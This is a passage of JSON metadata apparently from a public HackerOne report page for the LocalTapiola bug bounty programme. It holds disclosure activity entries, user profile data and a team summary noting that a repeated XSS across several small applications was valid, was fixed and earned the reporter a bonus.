disclosure","automated_response":false,"created_at":"2017-02-04T13:53:29.863Z","updated_at":"2017-02-04T13:53:29.863Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1521790,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-06T13:53:51.742Z","updated_at":"2017-03-06T13:53:51.742Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3310,"category":"team","content":"##Issue\n\nThe reporter found a repeated XSS in several small applications. The error was systemic in the sense that it was duplicated in all of these applications. \n\n##Fix\n\nThe issue was investigated and found to be valid.\n\n##Reasoning\n\nThe reported case was valid and within scope.  The applications as such, are not very critical and do not handle any customer information.  The reporter was awarded with a bonus for not making each and every URL a separate report. We like that.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}